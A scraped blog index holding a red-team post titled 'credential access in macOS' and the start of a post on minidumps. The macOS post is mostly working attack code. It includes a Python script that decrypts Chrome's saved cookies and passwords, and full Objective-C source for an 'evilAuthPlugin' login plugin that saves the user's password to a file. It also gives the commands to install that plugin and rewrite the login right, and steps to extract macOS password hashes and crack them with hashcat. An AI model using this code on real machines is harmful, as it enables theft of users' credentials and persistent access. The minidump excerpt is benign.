my_pass = chrome_secret.encode(\u0026#39;utf8\u0026#39;) #my_pass = my_pass.encode(\u0026#39;utf8\u0026#39;) iterations = 1003 cookie_file = os.path.expanduser(cookie_path) # Generate key from values above key = PBKDF2(my_pass, salt, length, iterations) def diagnose_database(db_path): try: if not os.path.exists(db_path): print(f\u0026#34;Error: The file {db_path} does not exist.\u0026#34;) return conn = sqlite3.connect(db_path) cursor = conn.cursor() # Check if the file is a valid SQLite database cursor.execute(\u0026#34;SELECT sqlite_version();\u0026#34;) version = cursor.fetchone() if version: print(f\u0026#34;Valid SQLite database. Version: {version[0]}\u0026#34;) else: print(\u0026#34;The file doesn\u0026#39;t appear to be a valid SQLite database.\u0026#34;) return # List all tables in the database cursor.execute(\u0026#34;SELECT name FROM sqlite_master WHERE type=\u0026#39;table\u0026#39;;\u0026#34;) tables = cursor.fetchall() if tables: print(\u0026#34;Tables in the database:\u0026#34;) for table in tables: print(f\u0026#34;- {table[0]}\u0026#34;) # Print schema for each table cursor.execute(f\u0026#34;PRAGMA table_info({table[0]})\u0026#34;) columns = cursor.fetchall() print(\u0026#34; Columns:\u0026#34;) for column in columns: print(f\u0026#34; {column[1]} ({column[2]})\u0026#34;) else: print(\u0026#34;No tables found in the database.\u0026#34;) except sqlite3.Error as e: print(f\u0026#34;SQLite error: {e}\u0026#34;) except Exception as e: print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) finally: if conn: conn.close() if cookie_path != \u0026#34;\u0026#34;: try: conn = sqlite3.connect(cookie_file) cursor = conn.cursor() # Check if the \u0026#39;cookies\u0026#39; table exists cursor.execute(\u0026#34;SELECT name FROM sqlite_master WHERE type=\u0026#39;table\u0026#39; AND name=\u0026#39;cookies\u0026#39;;\u0026#34;) if cursor.fetchone() is None: print(f\u0026#34;Error: The \u0026#39;cookies\u0026#39; table doesn\u0026#39;t exist in the database: {cookie_file}\u0026#34;) print(\u0026#34;Available tables:\u0026#34;) cursor.execute(\u0026#34;SELECT name FROM sqlite_master WHERE type=\u0026#39;table\u0026#39;;\u0026#34;) tables = cursor.fetchall() for table in tables: print(table[0]) else: sql = \u0026#39;select name, value, encrypted_value, path, host_key, expires_utc, is_httponly, samesite, is_secure, priority, last_access_utc, is_persistent, has_expires, source_scheme from cookies\u0026#39; cookies = {} cookies_list = [] try: for k, v, ev, path, domain, expirationDate, httpOnly, samesite, secure, priority, last_access, is_persistent, has_expires, source_scheme in conn.execute(sql): temp_val = {\u0026#34;name\u0026#34;: k, \u0026#34;value\u0026#34;: v, \u0026#34;path\u0026#34;: path, \u0026#34;domain\u0026#34;: domain, \u0026#34;expirationDate\u0026#34;: expirationDate, \u0026#34;httpOnly\u0026#34;: httpOnly, \u0026#34;samesite\u0026#34;: samesite, \u0026#34;secure\u0026#34;: secure, \u0026#34;id\u0026#34;: priority, \u0026#34;session\u0026#34;: is_persistent, \u0026#34;hostOnly\u0026#34;: False, \u0026#34;storeId\u0026#34;:\u0026#34;firefox-default\u0026#34;, \u0026#34;sameSite\u0026#34;:\u0026#34;no_restriction\u0026#34;,\u0026#34;firstPartyDomain\u0026#34;:\u0026#34;\u0026#34;} temp_val[\u0026#34;httpOnly\u0026#34;] = False if httpOnly == 0 else True temp_val[\u0026#34;secure\u0026#34;] = False if secure == 0 else True temp_val[\u0026#34;session\u0026#34;] = not bool(is_persistent) if v or (ev[:3] != b\u0026#39;v10\u0026#39;): pass else: temp_val[\u0026#39;value\u0026#39;] = chrome_decrypt(ev, key=key) cookies_list.append(temp_val) print(json.dumps(cookies_list, sort_keys=True, indent=4)) except sqlite3.OperationalError as e: print(f\u0026#34;Error executing SQL: {e}\u0026#34;) print(\u0026#34;Columns in the \u0026#39;cookies\u0026#39; table:\u0026#34;) cursor.execute(\u0026#34;PRAGMA table_info(cookies);\u0026#34;) columns = cursor.fetchall() for column in columns: print(column[1]) # Print column name except sqlite3.Error as e: print(f\u0026#34;SQLite error: {e}\u0026#34;) except Exception as e: print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) finally: if conn: conn.close() else: print(\u0026#34;Cookie path is empty. Please provide a valid path.\u0026#34;) if login_data != \u0026#34;\u0026#34;: fd = os.open(login_data, os.O_RDONLY) #open as read only database = sqlite3.connect(\u0026#39;/dev/fd/%d\u0026#39; % fd) os.close(fd) sql = \u0026#39;select username_value, password_value, origin_url from logins\u0026#39; decryptedList = [] with database: for user, encryptedPass, url in database.execute(sql): if user == \u0026#34;\u0026#34; or (encryptedPass[:3] != b\u0026#39;v10\u0026#39;): #user will be empty if they have selected \u0026#34;never\u0026#34; store password continue else: print(\u0026#34;Working on url: {}\u0026#34;.format(url)) urlUserPassDecrypted = (url, user, chrome_decrypt(encryptedPass, key=key)) decryptedList.append(urlUserPassDecrypted) print(json.dumps(decryptedList, sort_keys=True, indent=4)) if __name__ == \u0026#34;__main__\u0026#34;: cookie_path = \u0026#34;Cookies3\u0026#34; # Update this to the correct path print(f\u0026#34;Diagnosing database: {cookie_path}\u0026#34;) diagnose_database(cookie_path) credential access via authorization plugins authorization plugins (located in /Library/Security/SecurityAgentPlugins) extend the authentication system in macOS by allowing custom authentication methods to be integrated into the standard login process. securityd works with these plugins to handle authentication requests, by communicating with SecurityAgent, which loads + uses these plugins.\nthe plugins can implement custom authentication methods (biometric, 3rd-party IdPs) and so must be carefully designed and implemented.\nauth.db the authorization database (located at /var/db/auth.db) controls all the rules, policies, and plugins that are used when requests are processed via securityd. you can dump the information in this database by providing a \u0026ldquo;right-name\u0026rdquo; (check out the full list here ): security authorizationdb read \u0026lt;right-name\u0026gt;\n$ security authorizationdb read allow \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;class\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;allow\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;comment\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;Allow anyone.\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;created\u0026lt;/key\u0026gt; \u0026lt;real\u0026gt;719346785.95490503\u0026lt;/real\u0026gt; \u0026lt;key\u0026gt;modified\u0026lt;/key\u0026gt; \u0026lt;real\u0026gt;719346785.95490503\u0026lt;/real\u0026gt; \u0026lt;key\u0026gt;version\u0026lt;/key\u0026gt; \u0026lt;integer\u0026gt;0\u0026lt;/integer\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; YES (0) $ security authorizationdb read authenticate-session-owner-or-admin \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;allow-root\u0026lt;/key\u0026gt; \u0026lt;false/\u0026gt; \u0026lt;key\u0026gt;authenticate-user\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;class\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;user\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;comment\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;Authenticate either as the owner or as an administrator.\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;created\u0026lt;/key\u0026gt; \u0026lt;real\u0026gt;719346785.95490503\u0026lt;/real\u0026gt; \u0026lt;key\u0026gt;group\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;admin\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;modified\u0026lt;/key\u0026gt; \u0026lt;real\u0026gt;719346785.95490503\u0026lt;/real\u0026gt; \u0026lt;key\u0026gt;session-owner\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;shared\u0026lt;/key\u0026gt; \u0026lt;false/\u0026gt; \u0026lt;key\u0026gt;timeout\u0026lt;/key\u0026gt; \u0026lt;integer\u0026gt;2147483647\u0026lt;/integer\u0026gt; \u0026lt;key\u0026gt;tries\u0026lt;/key\u0026gt; \u0026lt;integer\u0026gt;10000\u0026lt;/integer\u0026gt; \u0026lt;key\u0026gt;version\u0026lt;/key\u0026gt; \u0026lt;integer\u0026gt;0\u0026lt;/integer\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; YES (0) authorization rights these are known as authorization rights. as you can see, they have a class key that has three possible values: user, rule, evaluate-mechanisms. the latter is a complex series of programmatic checks.\nan important right that i\u0026rsquo;ll look at is system.login.console. this controls access to console login on macOS. the loginwindow process tries to obtain this right during the login process, and sysadmins usually modify this right to add custom authC/authZ steps during login. it\u0026rsquo;s structured as a plist containing various keys, and modifying it can yield some pretty powerful effects.\n$ security authorizationdb read system.login.console \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;class\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;evaluate-mechanisms\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;comment\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;Login mechanism based rule. Not for general use, yet.\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;created\u0026lt;/key\u0026gt; \u0026lt;real\u0026gt;719346785.95490503\u0026lt;/real\u0026gt; \u0026lt;key\u0026gt;mechanisms\u0026lt;/key\u0026gt; \u0026lt;array\u0026gt; \u0026lt;string\u0026gt;builtin:prelogin\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;builtin:policy-banner\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;loginwindow:login\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;builtin:login-begin\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;builtin:reset-password,privileged\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;loginwindow:FDESupport,privileged\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;builtin:forward-login,privileged\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;builtin:auto-login,privileged\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;builtin:authenticate,privileged\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;PKINITMechanism:auth,privileged\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;builtin:login-success\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;loginwindow:success\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;HomeDirMechanism:login,privileged\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;HomeDirMechanism:status\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;MCXMechanism:login\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;CryptoTokenKit:login\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;loginwindow:done\u0026lt;/string\u0026gt; \u0026lt;/array\u0026gt; \u0026lt;key\u0026gt;modified\u0026lt;/key\u0026gt; \u0026lt;real\u0026gt;719346785.95490503\u0026lt;/real\u0026gt; \u0026lt;key\u0026gt;shared\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;tries\u0026lt;/key\u0026gt; \u0026lt;integer\u0026gt;10000\u0026lt;/integer\u0026gt; \u0026lt;key\u0026gt;version\u0026lt;/key\u0026gt; \u0026lt;integer\u0026gt;11\u0026lt;/integer\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; YES (0) the mechanisms array has a format of \u0026lt;plugin\u0026gt;:\u0026lt;mechanism\u0026gt;, and occasionally ,privileged, which means it runs as root. all these mechanisms need to return kAuthorizationResultAllow, otherwise the entire process fails. each plugin in this list gets called in order, as well.\nthe two main components of authorization in macOS are a user-and-owner model from BSD that applies to files + folders, and policy-based authorization requests for greater granularity. appls pass a list of requested rights to the Security Server which compares them against the authorization database. if there\u0026rsquo;s no valid cache entry, users might have to authenticate.\nyou can track rules + rights requested for certain actions, which is useful to see which rights are needed where.\n$ sudo log show --style syslog --predicate \u0026#39;subsystem == \u0026#34;com.apple.Authorization\u0026#34; \u0026amp;\u0026amp; eventMessage CONTAINS[c] \u0026#34;validating credential\u0026#34;\u0026#39; --last 8h Filtering the log data using \u0026#34;subsystem == \u0026#34;com.apple.Authorization\u0026#34; AND composedMessage CONTAINS[c] \u0026#34;validating credential\u0026#34;\u0026#34; Skipping info and debug messages, pass --info and/or --debug to include. Timestamp (process)[PID] 2024-10-10 09:21:47.878819-0400 localhost authd[445]: [com.apple.Authorization:authd] Validating credential bilal (501) for use-login-window-ui (engine 3299) it\u0026rsquo;s becoming increasingly likely that we can install our own authorization plugin into a system. first, i need to dump a copy of the right that i need (system.login.console): security authorizationdb read system.login.console \u0026gt; poc.plist.\ncustom authorization plugin since i want to create my own plugin and add it to the list after the user\u0026rsquo;s password is confirmed (by HomeDirMechanism returning true), i\u0026rsquo;ll need to craft some code and use the functions AuthorizationRightGet and AuthorizationRightSet. modifying the code taken from here (which is a UserConfigAgent program written in Objective-C), it should allow us to create an implant that will store the user\u0026rsquo;s password when they log back in.\nthis is the main.m function of the evilAuthPlugin program . you can modify the MechanismInvoke() function to perform any action, but for now it just saves the user\u0026rsquo;s password to /private/tmp/password.txt.\n#import \u0026lt;Foundation/Foundation.h\u0026gt; #import \u0026lt;Security/AuthorizationPlugin.h\u0026gt; #include \u0026lt;Security/AuthSession.h\u0026gt; #include \u0026lt;Security/AuthorizationTags.h\u0026gt; #include \u0026lt;CoreServices/CoreServices.h\u0026gt; #include \u0026#34;Common.h\u0026#34; #include \u0026lt;syslog.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define kKMAuthAuthorizeRight \u0026#34;authorize-right\u0026#34; #define kMechanismMagic \u0026#34;MLSP\u0026#34; #define kPluginMagic \u0026#34;PlgN\u0026#34; struct PluginRecord { OSType fMagic; // must be kPluginMagic const AuthorizationCallbacks * fCallbacks; }; typedef struct PluginRecord PluginRecord; struct MechanismRecord { OSType fMagic; // must be kMechanismMagic AuthorizationEngineRef fEngine; const PluginRecord * fPlugin; Boolean fWaitForDebugger; }; typedef struct MechanismRecord MechanismRecord; NSString *GetStringFromContext(struct MechanismRecord *mechanism, AuthorizationString key) { const AuthorizationValue *value; AuthorizationContextFlags flags; OSStatus err = mechanism-\u0026gt;fPlugin-\u0026gt;fCallbacks-\u0026gt;GetContextValue(mechanism-\u0026gt;fEngine, key, \u0026amp;flags, \u0026amp;value); if (err == errSecSuccess \u0026amp;\u0026amp; value-\u0026gt;length \u0026gt; 0) { NSString *s = [[NSString alloc] initWithBytes:value-\u0026gt;data length:value-\u0026gt;length encoding:NSUTF8StringEncoding]; return [s stringByReplacingOccurrencesOfString:@\u0026#34;\\0\u0026#34; withString:@\u0026#34;\u0026#34;]; } return nil; } NSString *GetStringFromHint(MechanismRecord *mechanism, AuthorizationString key) { const AuthorizationValue *value; OSStatus err = mechanism-\u0026gt;fPlugin-\u0026gt;fCallbacks-\u0026gt;GetHintValue(mechanism-\u0026gt;fEngine, key,\u0026amp;value); if (err == errSecSuccess \u0026amp;\u0026amp; value-\u0026gt;length \u0026gt; 0) { NSString *s = [[NSString alloc] initWithBytes:value-\u0026gt;data length:value-\u0026gt;length encoding:NSUTF8StringEncoding]; return [s stringByReplacingOccurrencesOfString:@\u0026#34;\\0\u0026#34; withString:@\u0026#34;\u0026#34;]; } return nil; } OSStatus AllowLogin(MechanismRecord *mechanism) { return mechanism-\u0026gt;fPlugin-\u0026gt;fCallbacks-\u0026gt;SetResult(mechanism-\u0026gt;fEngine,kAuthorizationResultAllow); } OSStatus MechanismCreate(AuthorizationPluginRef inPlugin,AuthorizationEngineRef inEngine,AuthorizationMechanismId mechanismId,AuthorizationMechanismRef *outMechanism) { MechanismRecord *mechanism = (MechanismRecord *)malloc(sizeof(MechanismRecord)); if (mechanism == NULL) return errSecMemoryError; mechanism-\u0026gt;fMagic = kMechanismMagic; mechanism-\u0026gt;fEngine = inEngine; mechanism-\u0026gt;fPlugin = (PluginRecord *)inPlugin; *outMechanism = mechanism; return errSecSuccess; } OSStatus MechanismDestroy(AuthorizationMechanismRef inMechanism) { free(inMechanism); return errSecSuccess; } OSStatus MechanismInvoke(AuthorizationMechanismRef inMechanism) { MechanismRecord *mechanism = (MechanismRecord *)inMechanism; @autoreleasepool { // Make sure this is not a hidden user. NSString *username = GetStringFromContext(mechanism, kAuthorizationEnvironmentUsername); NSString *password = GetStringFromContext(mechanism, kAuthorizationEnvironmentPassword); // NSString *sesOwner = GetStringFromHint(mechanism, kKMAuthSuggestedUser); NSString *AuthAuthorizeRight = GetStringFromHint(mechanism, kKMAuthAuthorizeRight); // Make sure we have username and password data. if (!username || !password) { return AllowLogin(mechanism); } BOOL keychainPasswordValid = YES; SecKeychainSetUserInteractionAllowed(NO); keychainPasswordValid = ValidateLoginKeychainPassword(password); // Revert back to the default ids pthread_setugid_np(KAUTH_UID_NONE, KAUTH_GID_NONE); //NSData *passwordData = [NSKeyedArchiver archivedDataWithRootObject:password]; if (keychainPasswordValid) { [password writeToFile:@\u0026#34;/private/tmp/password.txt\u0026#34; atomically:TRUE encoding:NSUTF8StringEncoding error:NULL]; } } return AllowLogin(mechanism); } OSStatus MechanismDeactivate(AuthorizationMechanismRef inMechanism) { MechanismRecord *mechanism = (MechanismRecord *)inMechanism; return mechanism-\u0026gt;fPlugin-\u0026gt;fCallbacks-\u0026gt;DidDeactivate(mechanism-\u0026gt;fEngine); } OSStatus PluginDestroy(AuthorizationPluginRef inPlugin) { free(inPlugin); return errSecSuccess; } OSStatus AuthorizationPluginCreate( const AuthorizationCallbacks *callbacks, AuthorizationPluginRef *outPlugin, const AuthorizationPluginInterface **outPluginInterface) { PluginRecord *plugin = (PluginRecord *)malloc(sizeof(PluginRecord)); if (plugin == NULL) return errSecMemoryError; plugin-\u0026gt;fMagic = kPluginMagic; plugin-\u0026gt;fCallbacks = callbacks; *outPlugin = plugin; static AuthorizationPluginInterface pluginInterface = { kAuthorizationPluginInterfaceVersion, \u0026amp;PluginDestroy, \u0026amp;MechanismCreate, \u0026amp;MechanismInvoke, \u0026amp;MechanismDeactivate, \u0026amp;MechanismDestroy }; *outPluginInterface = \u0026amp;pluginInterface; return errSecSuccess; } opening the project in XCode, there are some housekeeping items to be performed first.\nthe info.plist shows the high-level details of the plugin, including the bundle name and bundle identifier. we\u0026rsquo;ll change this to be something a little more innocuous.\nnote: the bundle name and identifier should match.\nbuild the project in XCode (Product -\u0026gt; Build), and then access the build via the Products directory on the left. when you find it in Finder, compress it and copy it over to the /Library/Security/SecurityAgentPlugins directory. once it\u0026rsquo;s copied over, unzip it into the directory.\n$ sudo cp evilAuthPlugin.bundle.zip /Library/Security/SecurityAgentPlugins $ sudo unzip evilAuthPlugin.bundle.zip Archive: evilAuthPlugin.bundle.zip creating: evilAuthPlugin.bundle/ creating: evilAuthPlugin.bundle/Contents/ creating: evilAuthPlugin.bundle/Contents/_CodeSignature/ creating: evilAuthPlugin.bundle/Contents/MacOS/ inflating: evilAuthPlugin.bundle/Contents/Info.plist inflating: evilAuthPlugin.bundle/Contents/_CodeSignature/CodeResources inflating: evilAuthPlugin.bundle/Contents/MacOS/evilAuthPlugin before proceeding, we have to modify the poc.plist file. add the following line: \u0026lt;string\u0026gt;BundleName:login,privileged\u0026lt;/string\u0026gt; to the file, so that it looks like this.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE plist PUBLIC \u0026#34;-//Apple//DTD PLIST 1.0//EN\u0026#34; \u0026#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd\u0026#34;\u0026gt; \u0026lt;plist version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;dict\u0026gt; \u0026lt;key\u0026gt;class\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;evaluate-mechanisms\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;comment\u0026lt;/key\u0026gt; \u0026lt;string\u0026gt;Login mechanism based rule. Not for general use, yet.\u0026lt;/string\u0026gt; \u0026lt;key\u0026gt;created\u0026lt;/key\u0026gt; \u0026lt;real\u0026gt;719346785.95490503\u0026lt;/real\u0026gt; \u0026lt;key\u0026gt;mechanisms\u0026lt;/key\u0026gt; \u0026lt;array\u0026gt; \u0026lt;string\u0026gt;builtin:prelogin\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;builtin:policy-banner\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;loginwindow:login\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;builtin:login-begin\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;builtin:reset-password,privileged\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;loginwindow:FDESupport,privileged\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;builtin:forward-login,privileged\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;builtin:auto-login,privileged\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;builtin:authenticate,privileged\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;PKINITMechanism:auth,privileged\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;builtin:login-success\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;loginwindow:success\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;HomeDirMechanism:login,privileged\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;HomeDirMechanism:status\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;BundleName:login,privileged\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;MCXMechanism:login\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;CryptoTokenKit:login\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;loginwindow:done\u0026lt;/string\u0026gt; \u0026lt;/array\u0026gt; \u0026lt;key\u0026gt;modified\u0026lt;/key\u0026gt; \u0026lt;real\u0026gt;719346785.95490503\u0026lt;/real\u0026gt; \u0026lt;key\u0026gt;shared\u0026lt;/key\u0026gt; \u0026lt;true/\u0026gt; \u0026lt;key\u0026gt;tries\u0026lt;/key\u0026gt; \u0026lt;integer\u0026gt;10000\u0026lt;/integer\u0026gt; \u0026lt;key\u0026gt;version\u0026lt;/key\u0026gt; \u0026lt;integer\u0026gt;11\u0026lt;/integer\u0026gt; \u0026lt;/dict\u0026gt; \u0026lt;/plist\u0026gt; update the authorization database.\nsecurity authorizationdb write system.login.console \u0026lt; poc.plist YES (0) you can force logout the user via the following command.\nsudo launchctl bootout user/$(id -u \u0026lt;username\u0026gt;) when they log back in, the code will have executed and the password will be at /private/tmp/password.txt!\njust some notes on this method, if you\u0026rsquo;re experimenting: modifying the login process is quite risky, and potentially dangerous. if you\u0026rsquo;re not sure what you\u0026rsquo;re doing, you could prevent anybody from logging in (including yourself) via the login screen.\ncredential access via ShadowHashData ShadowHashData is a mechanism in macOS used to store hashed password data for user accounts. it\u0026rsquo;s stored as binary .plist files for each user account in /var/db/dslocal/nodes/Default/users/.\nyou can extract it via default or dscl utilities.\n$ sudo dscl . read /Users/$USERNAME ShadowHashData dsAttrTypeNative:ShadowHashData: 62706c69 73743030 d2010203 0a5f101e 5352502d 52464335 3035342d 34303936 2d534841 3531322d 50424b44 46325f10 1453414c 5445442d 53484135 31322d50 424b4446 32d30405 06070809 58766572 69666965 72547361 6c745a69 74657261 74696f6e 734f1102 004350d6 29ecef1f 122a15ae ee030fa6 fa552525 6994b148 c9bdb3e0 bb652c88 0b82b334 4886ac55 9f04e045 bb494aea e73a5914 b68eb607 fd812f54 1c6ce2f5 c773be52 77c471bc 89df7ebd 0a0298b9 aa407330 e92816bf 732c10b0 09922f04 628fe872 b1b37778 0bd8221c d3487bee 42cf6a15 67802d13 4db26656 d0f2c17f 7c3ed954 c9fe56b8 615553a7 931ec655 4f526f5c c4541874 795b9b77 ce69d038 3380f493 c49d84ce 6e3f5d1c 0bb3df13 8bb379fb 99473936 817ba675 0409b97d 7026ab75 3778473c a51926a2 b1745b72 28285997 524e7ef0 4821f41e f6e1979f 88c0a2c1 103773d4 cc69b5e5 0515be57 7c901e6b 3abae24f 7716b146 c3763881 d1c41f79 3dee9577 3f66f969 db2ab6bb 331bd518 438e1d56 1e314fa1 c78ea486 ff7f09db 5bb94565 5406ff15 597396cb 6b4832bf 2baab2e8 3f9ed76f e6c0e11a 130f5403 59c2b47c 33b78f4f 0b969805 47ff5030 149a94e7 37fcf4a4 1d6e1837 d31e26ff 6c4de92f 5c0bce93 d9498299 a0d15668 2557da09 748c24a0 c20bc995 8b119c85 92f8c319 f17ac5c8 6631b9d8 11803fb6 ca2af51b 3ab52af7 354f61e1 87dcc684 57259217 32343cdd 200ec9bd fdb38f6a 3ffb135c 3d095b3d e40ac620 a3975056 ca8ee84a 175198b0 8c471e54 d2637140 eaaf40a8 673c8f70 b5fc4033 77a46b8b 0c65a69f 3817b8de fa028a7c 146705d6 1000652c dd4a6dce bf0d7aaf 2a4f1020 ba98c293 c1461cf9 c4df9952 569b14b9 1ff176e0 eddaee7c a4583f2d 097287c1 1200022e 09d30b05 060c0d09 57656e74 726f7079 4f1080e9 a36c9b06 438acd06 8982b946 ffa90aac e01574e3 cf98628c 4348784e 1630f0de 9e018c55 77d5d376 cc335136 57d3a593 e1fa565c 53b4a3fd 7dc1599e 2e60b3e1 f815a1d2 612f86cf 6e26d143 a0f202cc 5c0182a9 ea973682 cfd7859e 82ebc85b abdc8be1 845d26ce bb4a3594 f1654b86 e8476c4e 7d566916 0ae8c052 3491a94f 10205a83 6c31ba4a a34077d9 67368267 d314ddfa 2808e96e 6b58119a 26df3f67 c8c40008 000d002e 0045004c 0055005a 00650269 028c0291 029802a0 03230000 00000000 02010000 00000000 000e0000 00000000 00000000 00000000 0346 this contains the hashing algorithm (like PBKDF2), the number of iterations, the salt, and entropy (i.e. the actual hashed password.)\nyou can attempt to crack this using hashcat, with the form $ml$[iterations]$[salt]$[entropy], but this will be painfully slow.\ninstead, we can use Orchard to leverage JXA (JavaScript for Automation) to do some enumeration.\nset up a scripting environment:\n$ osascript -l JavaScript -i then enter the following command:\n\u0026gt;\u0026gt; eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(\u0026#39;https://raw.githubusercontent.com/its-a-feature/Orchard/master/Orchard.js\u0026#39;)),$.NSUTF8StringEncoding))); you can now call functions inside this environment. for example, i want to get my local user data.\nGet_LocalUser({user:\u0026#34;bilal\u0026#34;}) the output here is massive. i\u0026rsquo;m interested in dsAttrTypeNative:ShadowHashData, which manifests as a base64 blob. it\u0026rsquo;s easier to save the output to a file, then grep it.\nGet_LocalUser({user:\u0026#34;bilal\u0026#34;}) \u0026gt; user_data.json grep -A1 \u0026#34;dsAttrTypeNative:ShadowHashData\u0026#34; user_data.json once you collect the base64 blob above, feed it into the command below and decode it.\necho \u0026lt;blob\u0026gt; | base64 -D \u0026gt; shadowhash.bplist convert the plist to XML.\nplutil -convert xml1 shadowhash.bplist we\u0026rsquo;ll need the salt (SALTED-SHA512-PBKDF2) and entropy sections, and in hex, so let\u0026rsquo;s convert them.\necho \u0026lt;salt\u0026gt; | base64 -D \u0026gt; salt xxd -p salt | tr -d \u0026#39;\\n\u0026#39; now that we have all the parts, create a hash file for cracking. remember the format: $ml$iterations$salt$entropy.\nthe hashcat command to crack the password is simple, and all you need is a reliable password list (rockyou.txt).\nhashcat -m 7100 \u0026lt;hash-file\u0026gt; ~/tools/rockyou.txt ","date":"2024-10-08","permalink":"//localhost:1313/posts/macos-cred-access/","section":"","summary":"","tags":[],"title":"credential access in macOS"},{"categories":[],"contents":"imagine if your computer kept a journal. a journal not merely consisting of poetic silicon muses, but moment-by-moment accounts of all its inner workings. these journals exist, and they\u0026rsquo;re called minidumps. minidumps are compact snapshots of a computer\u0026rsquo;s memory, and they capture the essence of what\u0026rsquo;s happening inside your machine at any given moment.\nto the unitiated (or uninterested), minidumps would just look like cryptic glyphs, with maybe a vague understanding that these glyphs represent something \u0026ldquo;important\u0026rdquo;. indeed, minidumps are extremely valuable, and at the heart of a hidden conflict inside the digital world: they\u0026rsquo;re prized by software engineers hunting elusive bugs, revered by security/forensics experts trying to track down phantoms, and eyed warily by the very security systems designed to protect your computer.\nthink of your computer as if it were a bustling city, with programs + data zipping along like vehicles + people. a minidump is akin to a CCTV camera on a street corner that can freeze a moment in time, capturing everything in its view. now, imagine if someone could use that frozen image to understand traffic patterns, spot accidents before they\u0026rsquo;ve happened, or even identify \u0026ldquo;troublemakers\u0026rdquo;.\nhere\u0026rsquo;s where it gets interesting. just as a city might restrict where cameras can be placed, to protect residents\u0026rsquo; privacy, your computer has security systems that keep an eye on who\u0026rsquo;s taking these memory snapshots and why. it\u0026rsquo;s a delicate balance between the need for insight and the demand for security.\nAV/EDR most of us have had experience use AV (antivirus) tools in the past. EDR (endpoint detection + response) systems are an 